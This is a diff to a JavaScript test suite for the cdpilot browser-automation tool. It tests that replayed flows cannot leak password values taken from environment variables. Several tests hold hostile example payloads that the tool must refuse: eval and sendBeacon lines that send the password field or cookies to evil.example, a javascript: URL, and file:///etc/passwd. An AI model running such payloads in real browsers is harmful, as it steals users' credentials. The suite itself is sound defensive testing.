@@ -7030,12 +7030,12 @@ print(json.dumps(out))  # ASCII: Windows stdout is cp1252 and mangles « »
   // A stand-in for the user's own browser: test/connect_fake_cdp.py on a random
   // free port, carrying --remote-debugging-port=<port> like a real browser (so a
   // missing guard in cdpilot's kill path would find and signal it).
-  function startFake(mode = 'full', guid = 'guid-user') {
+  function startFake(mode = 'full', guid = 'guid-user', fakeEnv = {}) {
     const dir = mkHome();
     const port = freePort();
     const log = path.join(dir, 'fake-cdp.jsonl');
     const proc = spawn(PY_BIN, [FAKE_CDP, port, log, mode, guid, `--remote-debugging-port=${port}`],
-      { stdio: 'ignore' });
+      { stdio: 'ignore', env: { ...process.env, ...fakeEnv } });
     for (let i = 0; i < 50 && !(fs.existsSync(log) && fs.readFileSync(log, 'utf-8').includes('"ready"')); i++) {
       sleep(0.1);
     }
@@ -7711,6 +7711,75 @@ print(json.dumps(out))  # ASCII: Windows stdout is cp1252 and mangles « »
       assert.strictEqual(cli(['agent', 'run', 'inbox_triage'], env).status, 2);
       assert(!('known_flows' in JSON.parse(ok(['agent', 'observe']).stdout)));
     } finally { fake.stop(); }
+  });
+
+  test('learned flows (fake browser): run sets a placeholder by one checked call on the node, never focus + insertText; an iframe node is refused (exit 2)', () => {
+    // 2026-11-11 review: run focused the node and sent Input.insertText, which types into
+    // whatever has focus (an <iframe> ref moves it into the frame). Now one
+    // Runtime.callFunctionOn checks the node (top-level page, editable, not a frame) and the
+    // page's origin and sets the value; _VAR_TARGET_FN itself is unit-tested in the replay block.
+    const typed = 'zq-agent-placeholder-4412';
+    const teachAndRun = (fakeEnv, flowSrc) => {
+      const fake = startFake('full', 'guid-user', { FAKE_CDP_WATCH: typed, ...fakeEnv });
+      const home = mkHome();
+      writeRegistry(home, { proj: externalEntry(fake.port) });
+      const env = isoEnv(home, fake.port, 'proj');
+      const ok = (args, extra) => {
+        const r = cli(args, { ...env, ...(extra || {}) });
+        assert.strictEqual(r.status, 0, `${args.join(' ')} exit ${r.status}: ${r.stderr}\n${r.stdout}`);
+        return r;
+      };
+      const flowPath = path.join(home, 'projects', 'proj', 'flows', 'login.json');
+      if (flowSrc) {
+        fs.mkdirSync(path.dirname(flowPath), { recursive: true });
+        fs.writeFileSync(flowPath, flowSrc);
+      } else {
+        ok(['agent', 'act', '--url', 'https://user.example/inbox']);
+        const byName = Object.fromEntries(JSON.parse(ok(['agent', 'observe']).stdout).actions.map((a) => [a.name, a]));
+        ok(['agent', 'act', '--ref', byName.Password.ref, '--action', 'fill', '--text', typed]);
+        ok(['agent', 'flow', 'save', 'login']);
+      }
+      return { fake, env, ok, flowPath, mark: fake.entries().length };
+    };
+    const a = teachAndRun({});
+    let flowSrc;
+    try {
+      flowSrc = fs.readFileSync(a.flowPath, 'utf-8');
+      assert(JSON.parse(flowSrc).steps[1].text === '{{password}}', flowSrc);
+      for (const extra of [{}, { CDPILOT_VAR_PASSWORD: typed, CDPILOT_VAR_HOSTS: 'user.example' }]) {
+        const mark = a.fake.entries().length;
+        const args = ['agent', 'run', 'login', ...(extra.CDPILOT_VAR_PASSWORD ? [] : ['--var', `password=${typed}`])];
+        const run = JSON.parse(a.ok(args, extra).stdout);
+        assert.strictEqual(run.status, 'ok', JSON.stringify(run));
+        const since = a.fake.entries().slice(mark);
+        const carried = since.filter((x) => x.watch);
+        assert(carried.length === 1 && carried[0].method === 'Runtime.callFunctionOn' && carried[0].var_target,
+          `the value goes in one checked call: ${JSON.stringify(carried)}`);
+        assert(!since.some((x) => x.method === 'Input.insertText'), 'no Input.insertText for a placeholder');
+      }
+      // an environment value on a plain-http origin is refused before the call (as replay)
+      const http = JSON.parse(flowSrc);
+      http.name = 'login_http';
+      http.steps[0].url = 'http://user.example/inbox';
+      http.steps[1].before = { host: 'user.example', origin: 'http://user.example' };
+      fs.writeFileSync(path.join(path.dirname(a.flowPath), 'login_http.json'), JSON.stringify(http));
+      const r = cli(['agent', 'run', 'login_http'], { ...a.env, CDPILOT_VAR_PASSWORD: typed, CDPILOT_VAR_HOSTS: 'user.example' });
+      assert.strictEqual(r.status, 2, r.stdout + r.stderr);
+      assert(/only over https/.test(r.stderr) && !(r.stdout + r.stderr).includes(typed), r.stderr);
+    } finally { a.fake.stop(); }
+    // the Password node is an <iframe> here: refused in the call, nothing typed, no value printed
+    const b = teachAndRun({ FAKE_CDP_FRAME_NODES: '106' }, flowSrc);
+    try {
+      const r = cli(['agent', 'run', 'login', '--var', `password=${typed}`], b.env);
+      assert.strictEqual(r.status, 2, r.stdout + r.stderr);
+      const e = JSON.parse(r.stderr);
+      assert(e.step === 2 && /placeholder value refused: the target is an IFRAME/.test(e.error), r.stderr);
+      assert(!(r.stdout + r.stderr).includes(typed), 'no value printed');
+      const since = b.fake.entries().slice(b.mark);
+      assert(!since.some((x) => x.method === 'Input.insertText'), 'nothing typed');
+      const pw = since.filter((x) => x.var_target);
+      assert.strictEqual(pw.length, 1, JSON.stringify(since.map((x) => x.method)));
+    } finally { b.fake.stop(); }
   });
 
   test('mcp: browser_agent_observe/act/flow_save/run map to the agent commands (fake browser)', () => {
@@ -11899,8 +11968,9 @@ print(json.dumps(res))
   const PLANTED = 'zq-planted-value-7731';
   function varEnv(home, extra = {}) {
     const env = makeIsolatedEnv(home);
-    for (const k of Object.keys(env)) if (k.startsWith('CDPILOT_VAR_')) delete env[k];
+    for (const k of Object.keys(env)) if (k.startsWith('CDPILOT_VAR_') || k.startsWith('CDPILOT_REPLAY_')) delete env[k];
     delete env.CDPILOT_TARGET;
+    delete env.CDPILOT_ENTROPY;
     return { ...env, ...extra };
   }
   function writeFlow(home, steps) {
@@ -11919,14 +11989,14 @@ print(json.dumps(res))
   }
   // test/connect_fake_cdp.py: PAGE1 is https://user.example/inbox; Page.navigate moves the
   // tab this socket is attached to, and /json reports the new URL.
-  function startFakeCdp() {
+  function startFakeCdp(fakeEnvVars = {}) {
     const { spawn } = require('child_process');
     const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-fake-'));
     const port = spawnSync(PYB, ['-c', 'import socket; s = socket.socket(); s.bind(("127.0.0.1", 0)); '
       + 'print(s.getsockname()[1]); s.close()'], { encoding: 'utf-8', timeout: 10000 }).stdout.trim();
     const log = path.join(dir, 'fake.jsonl');
     const proc = spawn(PYB, [path.join(__dirname, 'connect_fake_cdp.py'), port, log, 'full', 'guid-rep'],
-      { stdio: 'ignore' });
+      { stdio: 'ignore', env: { ...process.env, ...fakeEnvVars } });
     for (let i = 0; i < 100 && !(fs.existsSync(log) && fs.readFileSync(log, 'utf-8').includes('"ready"')); i++) {
       spawnSync(PYB, ['-c', 'import time; time.sleep(0.1)']);
     }
@@ -12001,7 +12071,7 @@ print(json.dumps(res))
       ' "fill": sorted(vp("fill", ["--no-heal", "#a", "v1", "--ladder=x", "v2"])),',
       ' "type": sorted(vp("type", ["#a", "v"])),',
       ' "smart-fill": sorted(vp("smart-fill", ["Email", "a", "--b"])),',
-      ' "select": sorted(vp("select", ["#s", "opt"])),',
+      ' "select": sorted(vp("select", ["#s", "opt"])),',  // not a command (2026-11-11 review)
       ' "assert-value": sorted(vp("assert-value", ["#a", "v", "extra"])),',
       ' "go": sorted(vp("go", ["https://x/{{a}}"])),',
       ' "ok": why("fill", 1, vp("fill", ["#a", "{{a}}"]), ["#a", "{{a}}"], ["example.com"]),',
@@ -12017,7 +12087,7 @@ print(json.dumps(res))
     assert.deepStrictEqual(out.fill, [2, 4]);
     assert.deepStrictEqual(out.type, [1]);
     assert.deepStrictEqual(out['smart-fill'], [1]);
-    assert.deepStrictEqual(out.select, [1]);
+    assert.deepStrictEqual(out.select, []);
     assert.deepStrictEqual(out['assert-value'], [1]);
     assert.deepStrictEqual(out.go, []);
     assert.strictEqual(out.ok, null);
@@ -12034,7 +12104,8 @@ print(json.dumps(res))
       const flowPath = writeFlow(home, [
         { cmd: 'go', args: ['https://evil.example/login'], t_ms: 0 },
         { cmd: 'fill', args: ['#pw', '{{password}}'], t_ms: 10 },
-        { cmd: 'block', args: ['on'], t_ms: 20 },
+        // a command an environment-value flow may use (2026-11-11: `block` would refuse the flow)
+        { cmd: 'click', args: ['#next'], t_ms: 20 },
       ]);
       const r = runCli(['replay', flowPath, '--delay', 'none', '--continue'],
         fakeEnv(home, fake.port, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: 'example.com' }));
@@ -12120,6 +12191,329 @@ print(json.dumps(res))
     } finally {
       fake.stop();
     }
+  });
+
+  // ── 2026-11-11 review: the flow rule, option values, scheme and port, the child's one checked call ──
+  const REPO = path.join(__dirname, '..');
+  function py(script, args = []) {
+    return JSON.parse(execFileSync(PYB, ['-c', script, ...args], { cwd: REPO, encoding: 'utf-8', timeout: 20000 }).trim());
+  }
+  function refusedAt(r, step, cmd) {
+    assert.strictEqual(r.status, 2, r.stdout + r.stderr);
+    assert.strictEqual(r.stdout, '', `no step may run: ${r.stdout}`);
+    const e = errJson(r);
+    assert(e.refused && e.refused.length >= 1, r.stderr);
+    assert.deepStrictEqual([e.refused[0].step, e.refused[0].cmd], [step, cmd], JSON.stringify(e.refused[0]));
+    assert(/may not run in a flow that types an environment value/.test(e.refused[0].why), e.refused[0].why);
+    noSecret(r);
+    return e;
+  }
+  function fakeEntries(fake) {
+    return fs.readFileSync(fake.log, 'utf-8').split('\n').filter(Boolean).map((l) => JSON.parse(l));
+  }
+
+  test('replay: env var — a script step after or before the fill refuses the whole flow before step 1 (eval, batch, run, tools…)', () => {
+    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-envflow-'));
+    const env = varEnv(home, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: 'bank.example' });
+    const go = { cmd: 'go', args: ['https://bank.example/login'], t_ms: 0 };
+    const fill = { cmd: 'fill', args: ['#password', '{{password}}'], t_ms: 10 };
+    const exfil = { cmd: 'eval', t_ms: 20,
+      args: ["location='https://evil.example/?'+encodeURIComponent(document.querySelector('#password').value)"] };
+    // the review's exploit: the fill is checked, the eval after it read the field
+    const e = refusedAt(runCli(['replay', writeFlow(home, [go, fill, exfil]), '--delay', 'none'], env), 3, 'eval');
+    assert.deepStrictEqual(e.refused.map((x) => x.var), ['password']);
+    // the variant: a listener installed before the fill
+    const listen = { cmd: 'eval', t_ms: 5,
+      args: ["document.addEventListener('input', e => navigator.sendBeacon('https://evil.example', e.target.value), true)"] };
+    refusedAt(runCli(['replay', writeFlow(home, [go, listen, fill]), '--delay', 'none'], env), 2, 'eval');
+    // settled before any step: --dry-run and --continue alike
+    refusedAt(runCli(['replay', writeFlow(home, [go, fill, exfil]), '--dry-run'], env), 3, 'eval');
+    refusedAt(runCli(['replay', writeFlow(home, [go, fill, exfil]), '--delay', 'none', '--continue'], env), 3, 'eval');
+    // every other way to run page script, another command, or read / move the page
+    for (const [cmd, args] of [['batch', []], ['eval-batch', ['["document.title"]']], ['run', ['steal.cdp']],
+      ['tools', ['call', 'login', '{}']], ['multi-eval', ['1']], ['frame', ['eval', '1']],
+      ['agent', ['act', '--url', 'https://evil.example/']], ['extract', ['#password']], ['content', []],
+      ['cookies', ['save']], ['intercept', ['mock', '*', '{}']], ['new-tab', ['https://evil.example/']],
+      ['drag', ['#password', '#comment']], ['assert-attr', ['#password', 'value', 'x']], ['replay', ['other.json']]]) {
+      refusedAt(runCli(['replay', writeFlow(home, [go, fill, { cmd, args, t_ms: 30 }]), '--dry-run'], env), 3, cmd);
+    }
+    // --var keeps its behaviour: no flow rule (a dry run, browser-free)
+    const r = runCli(['replay', writeFlow(home, [go, fill, exfil]), '--dry-run', '--var', `password=${PLANTED}`], env);
+    assert.strictEqual(r.status, 0, r.stderr);
+    assert(r.stdout.includes('[3/3] eval'), r.stdout);
+    noSecret(r);
+  });
+
+  test('replay: env var — a flow of allowed steps passes; go takes http(s) only, keys no Ctrl/Alt/Meta, a plain assert-value is refused', () => {
+    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-envallow-'));
+    const env = varEnv(home, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: 'bank.example' });
+    const steps = [
+      ['go', ['https://bank.example/login']], ['dismiss', []], ['wait-for', ['#password', '5000']],
+      ['fill', ['#user', 'alice']], ['fill', ['#password', '{{password}}', '--no-heal']],
+      ['assert-value', ['#password', '{{password}}']], ['keys', ['shift+tab']], ['hover', ['#submit']],
+      ['scroll-to', ['#submit']], ['click', ['#submit']], ['dblclick', ['#x']], ['smart-click', ['Sign in']],
+      ['submit', ['form']], ['wait', ['#account']], ['wait-for-text', ['Welcome']], ['assert-visible', ['#account']],
+      ['assert-hidden', ['#error']], ['assert-count', ['.row', '2']], ['open', ['http://localhost:3001/next']],
+      ['type', ['#otp', '{{password}}']], ['smart-fill', ['Password', '{{password}}']],
+      ['smart-select', ['Question', '{{password}}']],
+    ].map(([cmd, args], i) => ({ cmd, args, t_ms: i }));
+    const r = runCli(['replay', writeFlow(home, steps), '--dry-run'], env);
+    assert.strictEqual(r.status, 0, r.stderr);
+    assert(r.stdout.includes(`[${steps.length}/${steps.length}] smart-select Question {{password}}`), r.stdout);
+    noSecret(r);
+    const withStep = (cmd, args) => steps.slice(0, 5).concat([{ cmd, args, t_ms: 99 }]);
+    for (const url of ['javascript:fetch("https://evil.example/?"+document.cookie)', 'data:text/html,<script>1</script>',
+      'file:///etc/passwd', 'about:blank', 'chrome://settings', 'blob:https://bank.example/x', 'bank.example/login']) {
+      const e = refusedAt(runCli(['replay', writeFlow(home, withStep('go', [url])), '--dry-run'], env), 6, 'go');
+      assert(/only an http\(s\) URL/.test(e.refused[0].why), e.refused[0].why);
+    }
+    // a --var value filling a go URL is checked after filling
+    let e = refusedAt(runCli(['replay', writeFlow(home, withStep('open', ['{{next}}'])), '--dry-run',
+      '--var', 'next=javascript:alert(1)'], env), 6, 'open');
+    assert(!(JSON.stringify(e)).includes('alert'), 'the --var value is not echoed');
+    for (const combo of ['ctrl+c', 'Meta+v', 'control+a', 'alt+tab']) {
+      e = refusedAt(runCli(['replay', writeFlow(home, withStep('keys', [combo])), '--dry-run'], env), 6, 'keys');
+      assert(/Ctrl\/Alt\/Meta/.test(e.refused[0].why), e.refused[0].why);
+    }
+    // assert-value without the environment value would print the field's actual value
+    e = refusedAt(runCli(['replay', writeFlow(home, withStep('assert-value', ['#password', 'guess'])), '--dry-run'], env),
+      6, 'assert-value');
+    assert(/actual value/.test(e.refused[0].why), e.refused[0].why);
+  });
+
+  test('replay: env var — every command in REPLAY_ENV_FLOW_CMDS and RECORD_INPUT_CMDS is a dispatcher command', () => {
+    const [flowCmds, inputCmds] = py('import sys, json; sys.path.insert(0, "src")\n'
+      + 'from cdpilot import REPLAY_ENV_FLOW_CMDS as a, RECORD_INPUT_CMDS as b\n'
+      + 'print(json.dumps([sorted(a), sorted(b)]))');
+    const main = PY_CONTENT.slice(PY_CONTENT.indexOf('def _cli_main():'));
+    for (const name of [...flowCmds, ...inputCmds]) {
+      if (name === 'open') {
+        assert(/if cmd == 'open':\s*\n\s*cmd = 'go'/.test(main), 'open is the go alias');
+        continue;
+      }
+      assert(new RegExp(`['"]${name}['"]:\\s*(lambda|cmd_)`).test(main), `${name} is not a dispatcher command`);
+    }
+    assert(!inputCmds.includes('select'), 'select is no command');
+    for (const out of ['eval', 'multi-eval', 'eval-batch', 'batch', 'run', 'tools', 'frame', 'agent', 'assert',
+      'assert-url', 'assert-title', 'assert-attr', 'assert-value', 'new-tab', 'drag', 'upload', 'intercept']) {
+      assert(!flowCmds.includes(out), `${out} must not be in REPLAY_ENV_FLOW_CMDS`);
+    }
+  });
+
+  test('replay: env var — an option value (--timeout, --frame, --entropy …) is never a value position; humanized typing is refused', () => {
+    const out = py([
+      'import sys, json; sys.path.insert(0, "src")',
+      'from cdpilot import _replay_value_positions as vp, _replay_env_refusal as why',
+      'a = ["#pw", "--timeout", "{{a}}"]',
+      'print(json.dumps({',
+      ' "timeout": sorted(vp("fill", a)), "why": why("fill", 2, vp("fill", a), a, ["x"]),',
+      ' "lead": sorted(vp("fill", ["--timeout", "5", "#pw", "{{a}}"])),',
+      ' "entropy": sorted(vp("fill", ["#pw", "--entropy", "on", "{{a}}"])),',
+      ' "frame": sorted(vp("smart-fill", ["--frame", "#f", "Email", "{{a}}"])),',
+      ' "label": sorted(vp("smart-fill", ["Email", "--frame", "{{a}}"])),',
+      ' "assert": sorted(vp("assert-value", ["--timeout", "5", "#a", "{{a}}"])),',
+      ' "unknown": sorted(vp("fill", ["#pw", "--zz", "{{a}}"])),',
+      ' "noheal": sorted(vp("fill", ["#pw", "--no-heal", "{{a}}"])),',
+      '}))'].join('\n'));
+    assert.deepStrictEqual([out.timeout, out.lead, out.entropy, out.frame, out.label, out.assert, out.unknown, out.noheal],
+      [[], [3], [3], [3], [], [3], [], [2]]);
+    assert(/value of an option \(--timeout\)/.test(out.why), out.why);
+    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-envopt-'));
+    const env = varEnv(home, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: 'bank.example' });
+    const run1 = (args, extra = {}) => runCli(['replay', writeFlow(home, [{ cmd: 'fill', args, t_ms: 0 }]), '--dry-run'],
+      { ...env, ...extra });
+    let r = run1(['#pw', '--timeout', '{{password}}']);
+    assert.strictEqual(r.status, 2, r.stderr);
+    assert(/value of an option \(--timeout\)/.test(errJson(r).refused[0].why), r.stderr);
+    noSecret(r);
+    for (const [args, extra] of [[['#pw', '{{password}}', '--entropy=on'], {}], [['#pw', '--entropy', '{{password}}'], {}],
+      [['#pw', '{{password}}'], { CDPILOT_ENTROPY: 'on' }]]) {
+      r = run1(args, extra);
+      assert.strictEqual(r.status, 2, `${args}: ${r.stderr}`);
+      assert(/humanized|value of an option/.test(errJson(r).refused[0].why), r.stderr);
+      noSecret(r);
+    }
+    r = run1(['#pw', '{{password}}', '--entropy=off']);
+    assert.strictEqual(r.status, 0, r.stderr);
+  });
+
+  test('replay: the output scrub removes a value, its repr, JSON-escaped and URL-encoded forms', () => {
+    const v = 'a\\b"c\'d\ne-é %2F&';
+    const res = py([
+      'import sys, json, urllib.parse; sys.path.insert(0, "src")',
+      'from cdpilot import _replay_scrub',
+      'v = json.loads(sys.argv[1])',
+      'forms = [v, repr(v), json.dumps(v), json.dumps(v)[1:-1], urllib.parse.quote(v, safe=""), urllib.parse.quote(v),',
+      '         urllib.parse.quote_plus(v), ascii(v)[1:-1], json.dumps(v, ensure_ascii=False)[1:-1]]',
+      'text = "got " + " | ".join(forms) + " end"',
+      'print(json.dumps({"out": _replay_scrub(text, {"pw": v}), "n": len(forms),',
+      '                  "same": _replay_scrub("pw and pw", {"pw": "pw"}), "empty": _replay_scrub("x", {"e": ""})}))',
+    ].join('\n'), [JSON.stringify(v)]);
+    assert.strictEqual(res.out, 'got ' + Array(res.n).fill('{{pw}}').join(' | ') + ' end', res.out);
+    assert.strictEqual(res.same, '{{pw}} and {{pw}}');
+    assert.strictEqual(res.empty, 'x');
+  });
+
+  test('replay: env var — the live page must be https (http only on loopback) on the port its entry names', () => {
+    const cases = [
+      ['https://bank.example/', 'bank.example', null], ['https://a.bank.example/x', 'bank.example', null],
+      ['https://bank.example:443/', 'bank.example', null], ['http://bank.example/', 'bank.example', 'only over https'],
+      ['http://10.0.0.5/', '10.0.0.5', 'only over https'], ['https://bank.example:8443/', 'bank.example', 'host:8443'],
+      ['https://bank.example:8443/', 'bank.example:8443', null], ['https://bank.example/', 'bank.example:8443', 'does not name it'],
+      ['http://localhost:3001/', 'localhost:3001', null], ['http://localhost:3001/', 'localhost', 'host:3001'],
+      ['http://127.0.0.1/', '127.0.0.1', null], ['http://[::1]:8080/', '[::1]:8080', null],
+      ['http://app.localhost/', 'app.localhost', null], ['https://evil.example/', 'bank.example', 'does not name it'],
+      ['about:blank', 'bank.example', 'no host'], ['data:text/html,x', 'bank.example', 'no host'],
+    ];
+    const got = py('import sys, json; sys.path.insert(0, "src")\n'
+      + 'from cdpilot import _var_url_allowed as ua, _var_host_entries as he\n'
+      + 'print(json.dumps([ua(u, he(h)) for u, h in json.loads(sys.argv[1])]))', [JSON.stringify(cases.map((c) => c.slice(0, 2)))]);
+    cases.forEach(([u, h, want], i) => {
+      if (want === null) assert.strictEqual(got[i], null, `${u} / ${h}: ${got[i]}`);
+      else assert(got[i] && got[i].includes(want), `${u} / ${h}: ${got[i]}`);
+    });
+    const fake = startFakeCdp({ FAKE_CDP_DOM: '1' });
+    try {
+      const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-envport-'));
+      const flow = (url) => writeFlow(home, [{ cmd: 'go', args: [url], t_ms: 0 },
+        { cmd: 'fill', args: ['#pw', '{{password}}'], t_ms: 10 }]);
+      const env = (hosts) => fakeEnv(home, fake.port, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: hosts });
+      let r = runCli(['replay', flow('http://login.example.com/'), '--delay', 'none'], env('example.com'));
+      assert.strictEqual(r.status, 2, r.stdout + r.stderr);
+      assert(r.stdout.includes('[2/2] fill #pw ... refused'), r.stdout);
+      assert(/only over https/.test(errJson(r).refused[0].why), r.stderr);
+      noSecret(r);
+      r = runCli(['replay', flow('https://login.example.com:8443/'), '--delay', 'none'], env('example.com'));
+      assert.strictEqual(r.status, 2, r.stdout + r.stderr);
+      assert(/host:8443/.test(errJson(r).refused[0].why), r.stderr);
+      assert(!fs.readFileSync(fake.log, 'utf-8').includes(PLANTED), 'the value never reached the browser');
+      r = runCli(['replay', flow('https://login.example.com:8443/'), '--delay', 'none'], env('login.example.com:8443'));
+      assert(/\[2\/2\] fill #pw \.\.\. ok/.test(r.stdout), r.stdout + r.stderr);
+      assert.strictEqual(r.status, 0, r.stderr);
+      noSecret(r);
+    } finally {
+      fake.stop();
+    }
+  });
+
+  test('replay: env var — the child types in one checked call: an iframe target is refused, the value is in no script (fake CDP)', () => {
+    const fake = startFakeCdp({ FAKE_CDP_WATCH: PLANTED, FAKE_CDP_DOM: '1' });
+    try {
+      const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cdpilot-rep-envstrict-'));
+      const env = fakeEnv(home, fake.port, { CDPILOT_VAR_PASSWORD: PLANTED, CDPILOT_VAR_HOSTS: 'example.com' });
+      // an <iframe> named without >>>: focus would move into the frame; the field check refuses
+      let r = runCli(['replay', writeFlow(home, [
+        { cmd: 'go', args: ['https://login.example.com/'], t_ms: 0 },
+        { cmd: 'fill', args: ['iframe#widget', '{{password}}'], t_ms: 10 },
+        { cmd: 'click', args: ['#next'], t_ms: 20 }]), '--delay', 'none', '--continue'], env);
+      assert.strictEqual(r.status, 2, r.stdout + r.stderr);
+      assert(r.stdout.includes('[2/3] fill iframe#widget ... refused (2)'), r.stdout);
+      assert(!r.stdout.includes('[3/3]'), 'a refusal stops the replay, --continue or not');
+      assert(/IFRAME, not a field/.test(r.stderr), r.stderr);
+      noSecret(r);
+      let carried = fakeEntries(fake).filter((x) => x.watch).map((x) => x.method);
+      assert.deepStrictEqual([...new Set(carried)], ['Runtime.callFunctionOn'], JSON.stringify(carried));
+      // a field: set in that call; the next step, with no environment value, runs without the
+      // strict pair even when replay itself inherited one
+      const before = fakeEntries(fake).length;
+      r = runCli(['replay', writeFlow(home, [
+        { cmd: 'go', args: ['https://login.example.com/'], t_ms: 0 },
+        { cmd: 'fill', args: ['#pw', '{{password}}'], t_ms: 10 },
+        { cmd: 'fill', args: ['#user', 'alice'], t_ms: 20 }]), '--delay', 'none'],
+      { ...env, CDPILOT_REPLAY_STRICT_TARGET: '1', CDPILOT_REPLAY_ALLOWED_HOSTS: 'evil.example' });
+      assert.strictEqual(r.status, 0, r.stdout + r.stderr);
+      assert(r.stdout.includes('[2/3] fill #pw ... ok') && r.stdout.includes('[3/3] fill #user ... ok'), r.stdout);
+      noSecret(r);
+      const run2 = fakeEntries(fake).slice(before);
+      assert.strictEqual(run2.filter((x) => x.var_target).length, 1, 'only the environment step uses the checked call');
+      carried = run2.filter((x) => x.watch).map((x) => x.method);
+      assert.deepStrictEqual(carried, ['Runtime.callFunctionOn'], JSON.stringify(carried));
+      // the child alone, in strict mode: no humanized typing, no frame (refused before any lookup)
+      const strict = { ...fakeEnv(home, fake.port), CDPILOT_REPLAY_STRICT_TARGET: '1', CDPILOT_REPLAY_ALLOWED_HOSTS: 'example.com' };
+      for (const args of [['fill', '#pw', 'x', '--entropy=on'], ['type', 'iframe#w >>> #pw', 'x'],
+        ['smart-fill', 'Password', 'x', '--frame', '#w'], ['smart-select', 'Main >>> Country', 'x']]) {
+        r = runCli(args, strict);
+        assert.strictEqual(r.status, 2, `${args.join(' ')}: ${r.stdout}${r.stderr}`);
+        assert(/refused \(environment value\): never (with humanized typing|inside a frame)/.test(r.stderr), r.stderr);
+      }
+    } finally {
+      fake.stop();
+    }
+  });
+
+  test('replay/agent: _VAR_TARGET_FN checks the page first, then the field, then sets the value (vm, no browser)', () => {
+    const vm = require('vm');
+    const src = execFileSync(PYB, ['-c', 'import sys; sys.path.insert(0, "src"); from cdpilot import _VAR_TARGET_FN; print(_VAR_TARGET_FN)'],
+      { cwd: REPO, encoding: 'utf-8', timeout: 20000 });
+    const hosts = [['bank.example', null], ['localhost', 3001]];
+    const plain = (x) => JSON.parse(JSON.stringify(x));  // a value from the vm realm
+    function page(url, inFrame = false) {
+      const u = new URL(url);
+      const log = [];
+      const ctx = { location: { protocol: u.protocol, hostname: u.hostname, port: u.port, origin: u.origin } };
+      vm.createContext(ctx);
+      vm.runInContext(`
+        var Event = function (t) { this.type = t; };
+        var HTMLInputElement = { prototype: {} }, HTMLTextAreaElement = { prototype: {} };
+        Object.defineProperty(HTMLInputElement.prototype, 'value', { set: function (v) { __log.push(['input', v]); this._v = v; } });
+        Object.defineProperty(HTMLTextAreaElement.prototype, 'value', { set: function (v) { __log.push(['textarea', v]); this._v = v; } });
+        var window = this, document = {};`, Object.assign(ctx, { __log: log }));
+      ctx.window.top = inFrame ? {} : ctx.window;
+      const fn = vm.runInContext('(' + src + ')', ctx);
+      const el = (tag, extra = {}) => Object.assign({ tagName: tag, ownerDocument: ctx.document,
+        focus() { log.push(['focus', tag]); }, dispatchEvent(e) { log.push(['event', e.type]); } }, extra);
+      return { fn, el, log, ctx };
+    }
+    const fill = { kind: 'fill', origin: null, hosts };
+    // a hostile page is told apart before the field is touched: no property of it is read
+    let p = page('https://evil.example/login');
+    const touched = [];
+    const trap = new Proxy({}, { get(t, k) { touched.push(String(k)); return undefined; } });
+    assert(/evil\.example, not a host/.test(p.fn.call(trap, 'S', fill).refused));
+    assert.deepStrictEqual(touched, []);
+    for (const [url, want] of [['http://bank.example/', /only over https/], ['https://bank.example:8443/', /bank\.example:8443/],
+      ['http://localhost:3002/', /localhost:3002/]]) {
+      p = page(url);
+      assert(want.test(p.fn.call(trap, 'S', fill).refused), url);
+    }
+    assert.deepStrictEqual(touched, []);
+    // the field: never an iframe/frame/object/embed, never a non-text input, top-level page only
+    for (const tag of ['IFRAME', 'FRAME', 'OBJECT', 'EMBED']) {
+      p = page('https://bank.example/');
+      assert.strictEqual(p.fn.call(p.el(tag), 'S', fill).refused, `the target is an ${tag}, not a field`);
+      assert.deepStrictEqual(p.log, [], 'no focus, no value');
+    }
+    p = page('https://bank.example/');
+    assert(/input of type checkbox/.test(p.fn.call(p.el('INPUT', { type: 'checkbox' }), 'S', fill).refused));
+    p = page('https://bank.example/', true);
+    assert(/top-level page/.test(p.fn.call(p.el('INPUT', { type: 'password' }), 'S', fill).refused));
+    assert.deepStrictEqual(p.log, []);
+    p = page('https://bank.example/');
+    assert(/top-level page/.test(p.fn.call(Object.assign(p.el('INPUT', { type: 'text' }), { ownerDocument: {} }), 'S', fill).refused));
+    // allowed: the native setter of the element's own kind, then input + change
+    p = page('https://sub.bank.example/login');
+    assert.deepStrictEqual(plain(p.fn.call(p.el('INPUT', { type: 'password' }), 'S', fill)), { ok: true, tag: 'INPUT' });
+    assert.deepStrictEqual(plain(p.log), [['focus', 'INPUT'], ['input', 'S'], ['event', 'input'], ['event', 'change']]);
+    p = page('http://localhost:3001/');
+    assert.strictEqual(p.fn.call(p.el('TEXTAREA'), 'S', fill).ok, true);
+    assert.deepStrictEqual(plain(p.log[1]), ['textarea', 'S']);
+    p = page('https://bank.example/');
+    const div = p.el('DIV', { isContentEditable: true });
+    assert.strictEqual(p.fn.call(div, 'S', fill).ok, true);
+    assert.strictEqual(div.textContent, 'S');
+    // select and assert
+    p = page('https://bank.example/');
+    const sel = p.el('SELECT', { options: [{ text: 'Turkey', value: 'tr' }, { text: 'Germany', value: 'de' }] });
+    assert.strictEqual(p.fn.call(sel, ' germany ', { kind: 'select', origin: null, hosts }).ok, true);
+    assert.strictEqual(sel.value, 'de');
+    assert(/not a <select>/.test(p.fn.call(p.el('INPUT', { type: 'text' }), 'x', { kind: 'select', origin: null, hosts }).refused));
+    assert.deepStrictEqual(plain(p.fn.call(p.el('INPUT', { type: 'text', value: 'S' }), 'S', { kind: 'assert', origin: null, hosts })),
+      { ok: true, tag: 'INPUT', equal: true });
+    // agent run: the exact recorded origin instead of the host list
+    p = page('https://user.example/inbox');
+    assert(/not https:\/\/other\.example/.test(p.fn.call(trap, 'S', { kind: 'fill', origin: 'https://other.example', hosts: null }).refused));
+    assert.strictEqual(p.fn.call(p.el('INPUT', { type: 'text' }), 'S', { kind: 'fill', origin: 'https://user.example', hosts: null }).ok, true);
+    assert.deepStrictEqual(touched, []);
   });
 
   test('record & replay e2e: go -> fill -> record stop -> replay (gated by CDPILOT_E2E=1)', () => {
